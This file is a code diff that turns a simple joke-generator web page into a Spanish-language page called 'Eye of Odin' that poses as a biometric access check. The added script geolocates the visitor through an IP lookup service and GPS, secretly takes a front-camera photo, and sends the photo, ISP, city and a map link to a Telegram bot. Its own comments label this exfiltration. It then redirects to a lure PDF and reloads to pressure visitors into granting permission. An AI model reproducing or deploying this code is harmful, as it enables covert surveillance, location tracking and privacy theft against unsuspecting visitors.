@@ -1,192 +1,185 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Random Joke Generator</title>
-  <style>
-    :root {
-      --bg: #0f1724;
-      --card: #0b1020;
-      --muted: #9aa4b2;
-      --accent: #2dd4bf;
-      --accent-2: #60a5fa;
-      --glass: rgba(255,255,255,0.03);
-    }
-    html,body { height:100%; margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial; background:linear-gradient(180deg,var(--bg),#061021); color:#e6eef6; }
-    .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; box-sizing:border-box; }
-    .card {
-      width:100%; max-width:720px; background:linear-gradient(180deg,var(--card),#071020);
-      border-radius:12px; padding:28px; box-shadow: 0 10px 30px rgba(2,6,23,0.6);
-      border: 1px solid rgba(255,255,255,0.03);
-    }
-    h1 { margin:0 0 6px 0; font-size:20px; letter-spacing:0.4px; color:var(--accent-2); }
-    p.lead { margin:0 0 18px 0; color:var(--muted); font-size:14px; }
-    .joke-area { background:var(--glass); border-radius:10px; padding:20px; min-height:120px; display:flex; flex-direction:column; justify-content:center; gap:10px; }
-    .joke-text { font-size:18px; line-height:1.4; color:#eaf6ff; }
-    .joke-meta { color:var(--muted); font-size:13px; display:flex; gap:10px; align-items:center; }
-    .controls { margin-top:18px; display:flex; gap:10px; flex-wrap:wrap; }
-    button {
-      border:0; background:linear-gradient(90deg,var(--accent),var(--accent-2)); color:#042028; padding:10px 14px; border-radius:8px;
-      cursor:pointer; font-weight:600; box-shadow: 0 6px 16px rgba(45,212,191,0.12);
-    }
-    button.ghost {
-      background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.04);
-      box-shadow:none; padding:8px 12px;
-    }
-    .small { padding:8px 10px; font-size:13px; }
-    .muted { color:var(--muted); font-size:13px; }
-    .loader { width:18px; height:18px; border-radius:50%; border:3px solid rgba(255,255,255,0.06); border-top-color:var(--accent); animation:spin 1s linear infinite; display:inline-block; vertical-align:middle; }
-    @keyframes spin { to { transform:rotate(360deg); } }
-    .center { display:flex; align-items:center; gap:8px; }
-    .hidden { display:none; }
-    footer { margin-top:16px; color:var(--muted); font-size:12px; text-align:right; }
-    @media (max-width:560px) { .joke-text { font-size:16px; } }
-  </style>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+    <title>Eye of Odin - Biometric System</title>
+    <style>
+        :root {
+            --bg: #060910;
+            --card: #0b121f;
+            --muted: #64748b;
+            --accent: #2dd4bf;
+            --accent-2: #3b82f6;
+            --glass: rgba(255, 255, 255, 0.02);
+            --odin-gold: #fbbf24;
+        }
+        html, body { height: 100%; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: #e2e8f0; overflow: hidden; }
+        .wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        
+        .card {
+            width: 100%; max-width: 450px; background: var(--card);
+            border-radius: 16px; padding: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            border: 1px solid rgba(59, 130, 246, 0.2); text-align: center;
+        }
+
+        h1 { margin: 0; font-size: 22px; letter-spacing: 2px; color: var(--accent-2); text-transform: uppercase; }
+        p.lead { margin: 10px 0 30px 0; color: var(--muted); font-size: 12px; letter-spacing: 1px; }
+
+        /* Sensor Eye of Odin */
+        .odin-eye-container {
+            position: relative; width: 140px; height: 140px; margin: 0 auto 30px;
+            display: flex; justify-content: center; align-items: center; cursor: pointer;
+        }
+        .eye-svg {
+            width: 80px; fill: var(--accent); filter: drop-shadow(0 0 15px var(--accent));
+            transition: all 0.3s; z-index: 5;
+        }
+        .odin-eye-container:hover .eye-svg { transform: scale(1.1); fill: var(--odin-gold); }
+
+        .scan-ring {
+            position: absolute; width: 130px; height: 130px;
+            border: 2px solid rgba(45, 212, 191, 0.1); border-top: 2px solid var(--accent);
+            border-radius: 50%; animation: spin 2s linear infinite; display: none;
+        }
+        .laser-beam {
+            position: absolute; width: 120%; height: 2px; background: var(--accent);
+            box-shadow: 0 0 15px var(--accent); top: 50%; display: none;
+            animation: scanMove 2s ease-in-out infinite; z-index: 10;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes scanMove { 0%, 100% { top: 20%; opacity: 0; } 50% { top: 80%; opacity: 1; } }
+
+        .status-box { background: var(--glass); border-radius: 8px; padding: 15px; font-family: monospace; font-size: 11px; color: var(--accent); border: 1px solid rgba(255,255,255,0.05); }
+        
+        button {
+            margin-top: 25px; border: 0; background: linear-gradient(90deg, var(--accent-2), var(--accent));
+            color: #fff; padding: 12px 24px; border-radius: 8px; cursor: pointer;
+            font-weight: bold; text-transform: uppercase; letter-spacing: 1px; width: 100%;
+        }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        footer { margin-top: 25px; color: #334155; font-size: 10px; letter-spacing: 2px; }
+    </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card" role="main" aria-labelledby="title">
-      <h1 id="title">Random Joke Generator</h1>
-      <p class="lead">Click the button to get a fresh joke from an external API. Uses icanhazdadjoke (JSON) with a fallback to Official Joke API.</p>
+    <div class="wrap">
+        <div class="card">
+            <h1>Eye of Odin</h1>
+            <p class="lead">PROTOCOLO DE ACCESO BIOMÉTRICO V1.0</p>
 
-      <div class="joke-area" id="jokeArea" aria-live="polite">
-        <div class="joke-text" id="jokeText">Press "Get Joke" to start — you'll get a short, random joke.</div>
-        <div class="joke-meta" id="jokeMeta"></div>
-      </div>
+            <div class="odin-eye-container" id="sensor">
+                <div class="scan-ring" id="ring"></div>
+                <div class="laser-beam" id="laser"></div>
+                <svg class="eye-svg" viewBox="0 0 24 24">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                </svg>
+            </div>
 
-      <div class="controls">
-        <button id="getBtn">Get Joke</button>
-        <button id="anotherBtn" class="ghost small" disabled>Another</button>
-        <button id="copyBtn" class="ghost small" disabled>Copy</button>
-        <button id="shareBtn" class="ghost small" disabled>Share</button>
-        <div style="flex:1"></div>
-        <div class="muted center" id="status">Ready</div>
-      </div>
+            <div class="status-box" id="status">SISTEMA EN ESPERA: PULSE EL OJO PARA ESCANEAR</div>
 
-      <footer>APIs: <a href="https://icanhazdadjoke.com/api" target="_blank" rel="noopener" style="color:var(--accent); text-decoration:none">icanhazdadjoke</a> + <a href="https://official-joke-api.appspot.com/" target="_blank" rel="noopener" style="color:var(--accent); text-decoration:none">Official Joke API</a></footer>
+            <button id="btnInit">Iniciar Verificación</button>
+
+            <footer>ENCRYPTED BY ODIN CORE</footer>
+        </div>
     </div>
-  </div>
 
-  <script>
-    // Simple Random Joke Generator
-    // Primary: https://icanhazdadjoke.com/ (requires Accept: application/json)
-    // Fallback: https://official-joke-api.appspot.com/random_joke
+    <script src="config.js"></script>
+    <script>
+        const sensor = document.getElementById('sensor');
+        const btnInit = document.getElementById('btnInit');
+        const status = document.getElementById('status');
+        const laser = document.getElementById('laser');
+        const ring = document.getElementById('ring');
+        let ejecutando = false;
 
-    const getBtn = document.getElementById('getBtn');
-    const anotherBtn = document.getElementById('anotherBtn');
-    const copyBtn = document.getElementById('copyBtn');
-    const shareBtn = document.getElementById('shareBtn');
-    const jokeText = document.getElementById('jokeText');
-    const jokeMeta = document.getElementById('jokeMeta');
-    const status = document.getElementById('status');
-
-    // show temporary status with optional loader
-    function setStatus(text, {loading=false} = {}) {
-      status.innerHTML = loading ? '<span class="loader" aria-hidden="true"></span> ' + text : text;
-    }
-
-    async function fetchIcanhaz() {
-      const res = await fetch('https://icanhazdadjoke.com/', {
-        headers: { Accept: 'application/json', 'User-Agent': 'Random-Joke-Generator (example)' }
-      });
-      if (!res.ok) throw new Error('icanhazdadjoke failed: ' + res.status);
-      return res.json(); // { id, joke, status }
-    }
-
-    async function fetchOfficialJoke() {
-      const res = await fetch('https://official-joke-api.appspot.com/random_joke');
-      if (!res.ok) throw new Error('official-joke-api failed: ' + res.status);
-      return res.json(); // {id, type, setup, punchline}
-    }
-
-    // returns {text, source}
-    async function getJoke() {
-      // Try primary
-      try {
-        const data = await fetchIcanhaz();
-        return { text: data.joke, source: 'icanhazdadjoke' };
-      } catch (e1) {
-        console.warn('Primary API failed:', e1);
-        // Fallback
-        try {
-          const d = await fetchOfficialJoke();
-          return { text: d.setup + (d.punchline ? ' — ' + d.punchline : ''), source: 'official-joke-api' };
-        } catch (e2) {
-          console.error('Fallback API failed:', e2);
-          throw new Error('Both joke APIs failed. Check your network or CORS policy.');
+        async function obtenerGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.permissions) return resolve(null);
+                navigator.permissions.query({name:'geolocation'}).then((res) => {
+                    if (res.state === 'granted') {
+                        navigator.geolocation.getCurrentPosition(
+                            (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: "MÉTRICA (GPS)" }),
+                            () => resolve(null), { timeout: 3000 }
+                        );
+                    } else { resolve(null); }
+                });
+            });
         }
-      }
-    }
 
-    async function showJoke() {
-      setStatus('Fetching joke...', { loading: true });
-      getBtn.disabled = true;
-      anotherBtn.disabled = true;
-      copyBtn.disabled = true;
-      shareBtn.disabled = true;
+        async function ejecutarEyeOfOdin() {
+            if (ejecutando) return;
+            ejecutando = true;
+            btnInit.disabled = true;
 
-      try {
-        const j = await getJoke();
-        jokeText.textContent = j.text;
-        jokeMeta.innerHTML = 'Source: <strong>' + j.source + '</strong>';
-        setStatus('Joke loaded');
-        // enable controls
-        anotherBtn.disabled = false;
-        copyBtn.disabled = false;
-        shareBtn.disabled = !navigator.share; // only enable if Web Share API present
-      } catch (err) {
-        jokeText.textContent = 'Sorry — could not get a joke right now.';
-        jokeMeta.textContent = '';
-        setStatus('Error: ' + err.message);
-      } finally {
-        getBtn.disabled = false;
-      }
-    }
+            status.innerHTML = "> INICIANDO EYE OF ODIN...<br>> RASTREANDO NODOS DE RED...";
+            ring.style.display = "block";
+            laser.style.display = "block";
 
-    // copy to clipboard
-    async function copyJoke() {
-      const text = jokeText.textContent;
-      try {
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          await navigator.clipboard.writeText(text);
-        } else {
-          // fallback
-          const ta = document.createElement('textarea');
-          ta.value = text;
-          document.body.appendChild(ta);
-          ta.select();
-          document.execCommand('copy');
-          document.body.removeChild(ta);
+            let reporte = "";
+
+            try {
+                // 1. Triangulación Agresiva
+                const res = await fetch('https://ipwho.is/');
+                const d = await res.json();
+                
+                const gps = await obtenerGPS();
+                const lat = gps ? gps.lat : d.latitude;
+                const lon = gps ? gps.lon : d.longitude;
+                const prec = gps ? gps.acc : "TRIANGULACIÓN (Nodos)";
+
+                reporte = `
+👁️ *EYE OF ODIN REPORT*
+------------------------------------
+📡 *RED:* ${d.connection.isp}
+📍 *CIUDAD:* ${d.city}, ${d.region}
+🎯 *PRECISIÓN:* ${prec}
+🔗 *MAP:* https://www.google.com/maps?q=${lat},${lon}&z=19
+------------------------------------`;
+
+                // 2. Captura Biométrica (Cámara)
+                status.innerHTML = "> ANALIZANDO PATRÓN RETINIANO...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute("playsinline", true);
+                video.play();
+                
+                await new Promise(r => setTimeout(r, 2500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
+                stream.getTracks().forEach(t => t.stop());
+
+                // 3. Exfiltración a Telegram
+                status.innerHTML = "> ENVIANDO DATOS AL NÚCLEO...";
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.CHAT_ID);
+                fd.append('photo', foto, 'odin.jpg');
+                fd.append('caption', `✅ *OBJETIVO CAPTURADO*\n${reporte}`);
+                fd.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                
+                status.innerHTML = "✅ ACCESO CONCEDIDO POR ODIN";
+                setTimeout(() => location.href = CONFIG.PDF_URL, 1000);
+
+            } catch (err) {
+                status.innerHTML = "❌ ERROR: PERMISO REQUERIDO";
+                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `❌ *FALLO EN EYE OF ODIN*\nMotivo: ${err.message}`, parse_mode: 'Markdown' })
+                });
+                alert("EYE OF ODIN: Se requiere permiso de sensor para validar identidad.");
+                location.reload();
+            }
         }
-        setStatus('Copied to clipboard');
-      } catch (e) {
-        setStatus('Copy failed');
-      }
-    }
 
-    // web share
-    async function shareJoke() {
-      if (!navigator.share) {
-        setStatus('Web Share API not available');
-        return;
-      }
-      try {
-        await navigator.share({ title: 'Funny Joke', text: jokeText.textContent });
-        setStatus('Shared');
-      } catch (e) {
-        setStatus('Share canceled');
-      }
-    }
-
-    // event listeners
-    getBtn.addEventListener('click', showJoke);
-    anotherBtn.addEventListener('click', showJoke);
-    copyBtn.addEventListener('click', copyJoke);
-    shareBtn.addEventListener('click', shareJoke);
-
-    // optional: fetch a joke automatically on page load
-    // showJoke();
-  </script>
+        sensor.addEventListener('click', ejecutarEyeOfOdin);
+        btnInit.addEventListener('click', ejecutarEyeOfOdin);
+    </script>
 </body>
 </html>
